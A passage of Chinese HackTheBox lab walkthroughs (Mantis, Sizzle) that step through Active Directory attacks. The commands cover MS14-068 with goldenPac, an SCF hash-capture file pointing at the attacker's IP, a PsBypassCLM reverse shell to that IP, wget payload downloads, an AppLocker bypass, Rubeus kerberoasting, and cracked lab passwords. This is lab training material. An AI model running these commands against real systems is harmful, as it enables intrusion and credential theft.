src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154849413-1830849376.png" alt="image-20240718154840864"></p><p><code>smb</code>同样没有什么重要信息</p><h2 id="rpc">rpc</h2><p>利用RPC远程过程调用枚举用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212255182-877972644.png" alt="image-20240718212246343"></p><p>允许匿名访问，但不允许执行命令。</p><h2 id="1337端口">1337端口</h2><p>此端口有<code>http</code>服务，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212343495-1754620610.png" alt="image-20240718212334561"></p><p>是个正常的<code>IIS</code>服务，当前页面没啥信息，利用<code>gobuster</code>工具扫描一下</p><p><code>gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105859519-1199674944.png" alt="image-20240719105840793"></p><p>发现有个<code>/secure_notes</code>目录，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105933756-1435935472.png" alt="image-20240719105916031"></p><p>发现有两个文件</p><ul><li><code>web_config</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105955413-1263203338.png" alt="image-20240719105944860"></p><p>这个没什么用，重点看第一个文件</p><ul><li><code>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110031571-1931928202.png" alt="image-20240719110021015"></p><p>看起来像是安装<code>cms</code>的操作步骤，如下载 SQL server 数据库、创建对应数据库和管理员等</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110135329-2021603843.png" alt="image-20240719110124666"></p><p>在最下面找到一串二进制文件，疑似<code>admin</code>密码，利用工具尝试解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110629100-105995333.png" alt="image-20240719110618385"></p><p>拿到密码<code>@dm!n_P@ssW0rd!</code></p><p>也可以利用<code>shell</code>命令解码</p><p><code>echo &quot;010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001&quot; | perl -lpe '$_=pack&quot;B*&quot;,$_'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111202945-1455444381.png" alt="image-20240719111148937"></p><p>这是会发现文件名像是某种编码，也拿工具尝试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110846704-1509776820.png" alt="image-20240719110835720"></p><p>成功拿到貌似是数据库的密码<code>m$$ql_S@_P@ssW0rd!</code></p><p>也可以利用<code>shell</code>命令解码</p><p><code> echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111302001-1732461918.png" alt="image-20240719111251279"></p><p>这样我们就拿到了两个密码</p><h2 id="1433端口">1433端口</h2><p>这个端口运行着<code>SQL Server</code>服务，上面已经拿到密码，尝试登陆</p><p>先尝试使用默认数据库管理员<code>sa</code>进行登录数据库</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'sa:m$$ql_S@_P@ssW0rd!@10.10.10.52'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719112910589-1427023602.png" alt="image-20240719112859624"></p><p>登陆失败，感觉是用户名不对，使用 <code>OrchardCMS</code> 的管理员 <code>admin</code> 作为用户名登陆</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113048163-1389822070.png" alt="image-20240719113037299"></p><p>登陆成功，接下来对数据库进行信息搜集，为了方便，使用<code>GUI</code>工具<code>DBeaver</code>进行连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113606800-1496602545.png" alt="image-20240719113555918"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113633820-92554602.png" alt="image-20240719113623175"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113856364-1854941201.png" alt="image-20240719113845434"></p><p>填好相关信息，下载好驱动就可以测试连接了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113934286-81611401.png" alt="image-20240719113923598"></p><p>连接成功！接下来就可以查找用户信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719114616076-1096852668.png" alt="image-20240719114605389"></p><p>最终在<code>orcharddb</code>数据库中的<code>blog_Orchard_Users_UserPartRecord</code>表中找到一个<code>James</code>用户的用户名和密码</p><p><code>james : J@m3s_P@ssW0rd!</code></p><h2 id="8080端口">8080端口</h2><p>这个端口有<code>http</code>服务，看样子是个<code>Blog</code>，先简单指纹识别一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718155206460-467081700.png" alt="image-20240718155158028"></p><p>发现<code>Orchard Core CMS</code></p><p>尝试搜索该CMS的历史漏洞，但是貌似没有什么能getshell的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719141417773-1235008164.png" alt="image-20240719141406528"></p><h1>James 渗透</h1><p>有了用户<code>James</code>的密码<code>J@m3s_P@ssW0rd!</code>接可以再次测试一些服务</p><h2 id="SMB-2">SMB</h2><p>利用<code>crackmapexec</code>尝试登录<code>SMB</code>服务</p><p><code>crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722093550555-1508748961.png" alt="image-20240722093527746"></p><p>尝试利用<code>smbmap</code>连接查看<code>SMB</code>服务</p><p><code>smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094127633-77556185.png" alt="image-20240722094104907"></p><p>发现当前用户对目录<code>SYSVOL</code>、<code>NETLOGON</code>拥有只读权限</p><h2 id="rpc-2">rpc</h2><p><code>rpcclient -U james 10.10.10.52 --password='J@m3s_P@ssW0rd!'</code></p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094339148-278161430.png" alt="image-20240722094316905"></p><p>找到以上用户，但是没什么用</p><h2 id="Kerberoasting">Kerberoasting</h2><p>尝试进行一下<code>Kerberoasting</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094800302-383462311.png" alt="image-20240722094731016"></p><p>仍然没有有用的信息</p><h1>MS14-068权限提升</h1><blockquote><p>ms14-068 漏洞产生的原因是普通用户向 kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么返回给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送给KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。而该漏洞的利用条件也非常简单，只需要拥有任意域用户的用户名、SID、密码即可获取域管理员权限。</p><p><a href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">参考链接</a></p></blockquote><p>先修改本地 hosts 文件完成域名解析</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">10.10.10.52 mantis.htb.local mantis</span><br><span class="line">10.10.10.52 htb.local</span><br></pre></td></tr></table></figure><p>使用 <code>impacket</code> 工具包中的<code>goldenPac.py</code>可获取目标的系统权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105556807-977799087.png" alt="image-20240722105534389"></p><p>成功拿到管理员权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105706614-1389153774.png" alt="image-20240722105644503"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105833170-745399915.png" alt="image-20240722105809518"></p><p>最后也是在<code>james</code>和<code>Administrator</code>的<code>Desktop</code>找到<code>user.txt</code>和<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Mantis</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Sizzle</title>
    <link href="https://www.fomal.cc/posts/33c7d1f3.html"/>
    <id>https://www.fomal.cc/posts/33c7d1f3.html</id>
    <published>2024-07-15T09:19:03.000Z</published>
    <updated>2024-10-12T11:01:07.255Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.103</p><p>攻击机ip：10.10.14.28</p></blockquote><h1>知识点</h1><ul><li>SCF文件攻击</li><li>Net-NTLMv2 hash破解</li><li>利用证书登录evil-winrm</li><li>BypassCLM</li><li>Kerberoasting</li><li>Bypass-AppLocker</li><li>DCSync攻击</li><li>PTH传递攻击</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714192941833-311799853.png" alt="image-20240714192938885"></p><p>发现有<code>ftp</code>服务、<code>DNS</code>服务、<code>Web</code>服务、<code>ldap</code>服务、 <code>smb</code>服务，域名为<code>HTB.LOCAL</code></p><h2 id="ftp">ftp</h2><p>扫描的结果显示<code>ftp</code>可以登录，使用<code>ftp</code>尝试登录</p><p><code>ftp 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715095535177-874727963.png" alt="image-20240715095535121"></p><p>没什么有用的信息</p><h2 id="Web">Web</h2><p>发现开放<code>80</code>和<code>443</code>两个端口，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102127906-768479907.png" alt="image-20240715102126567"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102138843-732144389.png" alt="image-20240715102138611"></p><p>发现两个网站可能是同一个</p><p>拿<code>dirsearch</code>扫一下网站目录</p><p><code>dirsearch -u http://10.10.10.103/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102637131-207095840.png" alt="image-20240715102636442"></p><p>很明显有个与众不同的结果访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102216653-962407690.png" alt="image-20240715102213171"></p><p>发现存在一个登录框，但是没有用户名和密码，先放着</p><h2 id="ldap">ldap</h2><p><code>ldapsearch -x -H ldap://10.10.10.103:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100348580-149165439.png" alt="image-20240715100348090"></p><p>没什么有用的信息</p><h2 id="SMB">SMB</h2><p><code>smbclient -N -L \\10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100733593-1338901198.png" alt="image-20240715100732440"></p><p>发现如上信息，测试一下</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/CertEnroll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715101406558-1730694173.png" alt="image-20240715101406187"></p><p>发现连接到<code>CertEnroll</code>，但是没有可执行命令的权限，但是这个很奇怪，感觉跟之前测试的<code>web</code>的登陆有关系，但是没有读取权限，继续测试</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/&quot;Department Shares&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102824347-2140539819.png" alt="image-20240715102824177"></p><p>发现在<code>Department Shares</code>里，可以继续操作，先接着测试</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/NETLOGON</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102714604-398683803.png" alt="image-20240715102714094"></p><p>还是无法执行命令，继续测试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715103850485-1432636840.png" alt="image-20240715103849910"></p><p>发现除了<code>Department Shares</code>其他都不可以正常执行命令，所以重点放在<code>Department Shares</code>上</p><p>我们注意到<code>dir</code>结果中有<code>Users</code>目录，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715104251701-1224385604.png" alt="image-20240715104251552"></p><p>拿到用户名列表，但是目录都是空的</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">amanda</span><br><span class="line">amanda_adm</span><br><span class="line">bill</span><br><span class="line">bobcd Users</span><br><span class="line">chris</span><br><span class="line">henry</span><br><span class="line">joe</span><br><span class="line">jose</span><br><span class="line">lkys37en</span><br><span class="line">morgan</span><br><span class="line">mrb3n</span><br><span class="line">Public</span><br></pre></td></tr></table></figure><p>为了方便后续操作以及便于查找相关文件，将<code>Department Shares</code>挂载到本地</p><p><code>mount -t cifs &quot;//10.10.10.103/Department Shares&quot; /root/htb/Machines/Sizzle/file</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715110927818-212747079.png" alt="image-20240715110927331"></p><p>文件有点多，写<code>bash</code>脚本检查该共享名下各个目录的写入权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> d | <span class="keyword">while</span> <span class="built_in">read</span> directory; <span class="keyword">do</span> </span><br><span class="line">    <span class="built_in">touch</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write file&quot;</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line">    <span class="built_in">mkdir</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write dir&quot;</span> &amp;&amp; <span class="built_in">rmdir</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715112556282-78033102.png" alt="image-20240715112555698"></p><p>结果显示<code>/Users/Public</code>、<code>/ZZ_ARCHIVE</code>目录拥有写入权限</p><h1>获取用户名密码</h1><h2 id="SCF文件攻击">SCF文件攻击</h2><blockquote><p>SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，然而，SCF 文件可用于访问渗透测试人员构建特定 UNC 路径用于攻击。将恶意代码可以放在一个SCF文件中，然后将其植入网络共享中。该文件在用户浏览文件所在目录时被执行，系统将通过smb协议向渗透测试人员构建的特定 UNC 路径发起Net-NTLM身份验证请求，此时的请求中包含该用户的Net-NTLM hash，攻击者使用responder即可捕获该用户的Net-NTLM  hash。</p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF文件攻击</a></p><p><a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">Net-NTLM hash利用</a></p></blockquote><p>了解完攻击原理，下面就开始操作</p><p>先准备一份<code>.scf</code>文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.28\icon</span><br></pre></td></tr></table></figure><p>将其保存为<code>evil.scf</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715133205878-926345847.png" alt="image-20240715133205426"></p><p>将这个文件复制到<code>/Users/Public</code>和<code>/ZZ_ARCHIVE</code>下</p><p><code>cp ./evil.scf ./file/Users/Public/</code></p><p><code>cp ./evil.scf ./file/ZZ_ARCHIVE/</code></p><p>这时发现长时间后，该文件会自动删除，所以我们要在有限的时间内完成该操作</p><p>利用<code>kali</code>中的<code>responder</code>工具监听<code>tun0</code>网卡</p><p><code>responder -v -I tun0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145001346-1000664214.png" alt="image-20240715145000909"></p><p>在<code>/Users/Public</code>或<code>/ZZ_ARCHIVE</code>目录下执行一下命令来确保对共享目录进行操作，如显示目录文件等操作后才会触发这个<code>evil.scf</code></p><p>这里在<code>/Users/Public</code>下执行<code>ls</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715143451775-597887204.png" alt="image-20240715143448053"></p><p>等待一段时间即可收到<code>hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715144941717-2133617100.png" alt="image-20240715144941244"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amanda::HTB:6c1c482b8fd38bcspan><br></pre></td></tr></table></figure><h2 id="Net-NTLMv2-hash破解">Net-NTLMv2 hash破解</h2><p>将上述<code>hash</code>值保存到文件<code>hash</code>中，使用<code>john</code>爆破</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145240039-45553713.png" alt="image-20240715145239638"></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145344115-203461178.png" alt="image-20240715145343859"></p><p>至此拿到一个用户名和密码：<code>amanda : Ashare1972</code></p><p>先利用<code>crackmapexec</code>验证一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145725094-1900698795.png" alt="image-20240715145724720"></p><p>尝试使用<code>evil-winrm</code>登陆失败</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150558411-1621839895.png" alt="image-20240715150558016"></p><p>猜测是身份验证出了问题</p><h1>通过获取的证书实现登录</h1><p>之前<code>web</code>服务有个登陆界面，尝试拿<code>amanda </code>的用户名登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150537725-584889206.png" alt="image-20240715150537115"></p><p>登陆成功</p><p>这个网站允许我生成一个证书，我们可以利用该证书来进行身份验证</p><p>我们可以创建自己的证书签名请求 (<code>csr</code>) 和密钥，然后将该 <code>CSR</code> 提交给服务器，它会返回给我一个证书。</p><p>首先使用 <code>openssl</code>创建 <code>CSR</code> 和密钥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153140520-1221636402.png" alt="image-20240715153139686"></p><p>按照网站上的步骤提交我们的证书请求</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153928398-419142793.png" alt="image-20240715153926792"></p><p>接着点击高级证书请求</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153942831-898952688.png" alt="image-20240715153942674"></p><p>准备好我们的证书签名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154050380-1923290039.png" alt="image-20240715154049876"></p><p>将其粘贴到网站中后点击提交</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154147499-1427367506.png" alt="image-20240715154147144"></p><p>证书生成成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162307496-991142482.png" alt="image-20240715162307140"></p><p>证书下载后移至本目录下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162436611-174996876.png" alt="image-20240715162429122"></p><p>有了证书和密钥可使用<code>evil-winrm</code>以<code>amanda</code>来进行身份验证。需要注意的是需要在端口<code>5689</code>上连接</p><p><code>evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S</code></p><p>这里使用<code>-S</code>参数来指定使用<code>ssl</code>证书登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715165028826-1008718515.png" alt="image-20240715165027041"></p><h1>AD域横移</h1><h2 id="环境受限">环境受限</h2><p>发现这个用户的桌面没有我们想要的东西，还需要继续探测，但是用自带的<code>uplaod</code>传文件传不上去，看了下报错，也在网上搜了一下，发现我们可能是处于 <code>PowerShell</code> 约束语言模式，以下命令可以检查当前<code>powershell</code>的模式</p><p><code>$executioncontext.sessionstate.languagemode</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192636382-579310471.png" alt="image-20240715192634771"></p><p>此时我们得到的是一个低权限<code>PS</code>控制台，并且改用<code>PowerShell Version 2</code>引擎也无法摆脱这种情况，由于<code>AppLocker</code>将<code>PowerShell</code>以约束模式运行，攻击者无法将<code>PowerShell</code>语言模式更改为完整模式以运行攻击工具，无法使用核心语言功能（例如，在内存中加载脚本等等…）是很难受的一件事情。</p><p>尝试发现一下域内的成员信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715193810763-1805696027.png" alt="image-20240715193810323"></p><p>去<code>Users</code>目录查看信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194308226-560865564.png" alt="image-20240715194307427"></p><p>发现有还有<code>sizzler</code>和<code>mrlky</code>用户，但是权限太低，看不了相关信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194339783-1164341773.png" alt="image-20240715194338217"></p><p><code> Get-AppLockerPolicy -Effective -XML</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715202041953-1069118467.png" alt="image-20240715202034344"></p><p>发现还有<code>AppLocker</code>限制</p><h2 id="BypassCLM">BypassCLM</h2><p>首先就是突破<code>powershell</code>约束语言模式，查找发现使用 PSByPassCLM 可突破<code>powershell</code>约束语言模式</p><p>工具下载地址：<a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a></p><p>因为之前传文件会有报错，所以先在本机开个<code>python</code>的<code>http</code>服务</p><p><code>python3 -m http.server 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203400670-1053471516.png" alt="image-20240715203359069"></p><p>在机器上执行如下命令即可将本地文件下载到机器上</p><p><code>wget http://10.10.14.28/PsBypassCLM.exe -OutFile PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203545502-881304560.png" alt="image-20240715203537943"></p><p>同时在本地开启监听服务</p><p><code>nc -lvp 8888</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204058957-49124056.png" alt="image-20240715204055299"></p><p>靶机上利用<code>PsBypassCLM</code>执行命令绕过<code>CLM</code>完成反弹shell</p><p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.28 /rport=8888 \users\amanda\Documents\PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204845934-1212222572.png" alt="image-20240715204844560"></p><p>反弹shell成功，并且成功突破了<code>powershell</code>约束语言模式</p><h2 id="Kerberoasting">Kerberoasting</h2><p>在新的会话中查看端口开放情况</p><p><code>netstat -ano</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715205626202-1739744831.png" alt="image-20240715205624669"></p><p>发现在之前扫描端口的时候并没有扫描到88端口，说明该端口可能已被防火墙屏蔽，但是在机器上开放了88端口，，所以我们可以使用<code>Kerberoast</code>，在这之前需要获取<code>Kerberoast</code></p><p>这里使用<code>Rubeus</code>工具来获取</p><ul><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li></ul><p>该工具需要自己编译<code>C#</code>来生成<code>exe</code>文件</p><p>同样利用``python<code>的</code>http<code>服务将</code>exe`上传至靶机</p><p><code>wget http://10.10.14.28/Rubeus.exe -outfile Rubeus.exe</code></p><p>在新的会话窗口中运行命令</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716100921540-393901722.png" alt="image-20240716100917944"></p><p>发现还有问题，多半是由<code>AppLocker</code>限制导致的，所以还需要绕过<code>AppLocker</code>限制</p><h2 id="Bypass-AppLocker">Bypass-AppLocker</h2><p>这里给一个不受<code>APPLocker</code>中<code>PowerShell</code>约束语言模式影响的路径</p><p>打印机驱动程序目录：<code>C:\Windows\System32\spool\drivers\color\</code></p><p>将<code>Rubeus.exe</code>传到这个目录下再执行命令</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716113734989-1612727273.png" alt="image-20240716113730945"></p><p>现在我们拿到了<code>mrlky</code>用户的<code>TGS</code>票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$303273AECC274ADF0D56393740ECBF1F$CC9D7AF049DFFC407CBA5AD753429F1609BD82F56372EEBD77C3E3C06CBA802DF56DFA81F043B7CEB4CA8F62FF7CF10BBE5F7EA6F8D48DC23CAD4B02D22842B816B5AB44682EA9AF1719015B23880E96C7DC98FE7F17DFA225EDDD357FBD7DF7479E6E16D08DF2EAD8576D726686D53AE8A10AF784A5A5C0E6686C48B9C1A34EE886C5114DBE1A889C0EB5FC79DDD9AE74EFDC1D61FC3828EE1B95E160A575453D1A2ABE6B140ECBE41DC055329CD54EEF9797D4276384EF73A6C531121476117FCC6633777D871397F553D04BF3ACE929B4F7D7BDC1287E7398D1023C4424D8DF0B143C4D3C6A4EEC295A09C41214CD08E692A2DFD602D5F3673932AA146A06B423C3A31F8F4D5F1AB64A0E64CABA76AC7D52207EEB32EC2AB7943237A3BFCC1F5A196182F7FE40A4BB237F31D54E231E9C8E8D12D22FCA1FAEB7DD30AF193EC1D73D7C057C0FCC0725F2FCF6A04C46AF3E776828AE29452B4DD9292F607082B93F13D3EF71F9AE488BE3903EA8A36A7F167626E758D2E949A5300C6E3A467152BA5D1339B2F1EB2DB221481B1B0C2C0716D2339970E081D83A8CF083DEFFA835DAF5A98AE975094DC352FCE733D6FF58336C7A44890ED844D391876B4C85CBED748D310B81B5ED4BF89C184941D4F9623A6F1BF1A94290F9D5D5189B014BFFC48F21788DAE22A7841D716E95E4B576277C80690FFBB49AE8B218DBFF6C540CE815B5AAAEC1E838719048886ACDC539A637DF26DFB4F21FDACE84D247C789B381F3381CBC21D319A0C19AB24187B96C4B7EC2DC009E3CE13DBD4E41561F26FAB3D9222622AD4F072454F247557E0AA2A9DD1C9574707A2AC3BE27B913B8B1387404109A1050619ACD87812566D324C0836934E05760F426872FAF5E24D6F076AE0C1225E8DF9B2102105ED275F8EB8C312150D418044F841684F56A70F07A07FC6B5417D3B4D44E3518DD11A8273E7DD006F03643F5766719034C54FEC044A7DA375F2219710CC5A3F0A2E4E721FB6F3A7AA3F20126836BB2120FCBDA4FF995C2DC84AECF736BD326B898171405DFBA5833D0563A8E211AB5F198D154A9C98DEF8335BB71CEC3810295F406C14AB98051F2A8E181FBA1FF712208316284254F854FB7E98954B1D8CA3B5360CB7FC7A1FA63FAF60A3D7516C90FAC94345862E2E2278E27B7131A6FE3D2529FA8B9694BD377401C185DF01EEBDD65E1B46C57B949CBB550F4FE14395EF75033EF319D2BEDC7B3D1F81E8C850A71DB696A33840C950C032C9B337543D0F0A28F1CD1B78897CABB3219497FDF7BBB5ED4D0F340A8D34EC14176F71D214C6BBB402824DD29101F819610A21405C3A0292E62C494758D0723716188</span><br></pre></td></tr></table></figure><h2 id="NTLM哈希破解">NTLM哈希破解</h2><p>将上述<code>hash</code>值保存到文件<code>spn-hash</code>中，使用<code>john</code>爆破</p><p><code>john spn-hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114611543-2034764138.png" alt="image-20240716114607870"></p><p><code>john spn-hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114618446-173345972.png" alt="image-20240716114615195"></p><p>这样就拿到了<code>mrlky</code>的明文密码：<code>Football#7</code></p><h2 id="evil-winrm证书登录">evil-winrm证书登录</h2><p>正常登录<code>evil-winrm</code>还是登录不了，跟之前一样，利用<code>web</code>页面生成证书，拿证书登录</p><p>首先使用 